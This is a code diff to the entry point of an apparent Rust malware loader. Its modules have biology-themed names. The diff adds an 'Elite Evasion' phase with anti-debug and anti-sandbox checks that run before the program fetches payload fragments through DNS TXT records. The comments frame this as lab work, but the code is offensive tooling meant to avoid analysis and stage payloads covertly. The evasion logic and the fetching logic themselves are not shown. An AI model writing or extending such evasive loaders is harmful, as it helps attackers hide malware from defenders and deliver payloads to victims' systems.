@@ -4,14 +4,26 @@ mod splicer;
 mod membrane;
 mod ribosome;
 mod network_t_rna;
+mod evasion;
 
 use fragments::FragmentSource;
 use splicer::Splicer;
 use membrane::Membrane;
 use ribosome::Ribosome;
 use network_t_rna::DnsTxtSource;
+use evasion::Evasion;
 
 fn main() {
+    // === Phase 0: Elite Evasion (Anti-Debug, Anti-Sandbox) ===
+    eprintln!("[*] Initializing Evasion modules...");
+    if let Err(e) = Evasion::verify_environment() {
+        eprintln!("[!] Evasion Triggered: {}", e);
+        // In a real staging environment, we would exit cleanly or spin to waste time.
+        // For lab verification, we print and exit.
+        std::process::exit(1);
+    }
+    eprintln!("[+] Environment pristine. Proceeding.");
+
     // === Phase 1: tRNA delivery — collect fragments via DNS TXT ===
     eprintln!("[*] Fetching payload fragments via DNS TXT (Port 53 UDP)...");
     
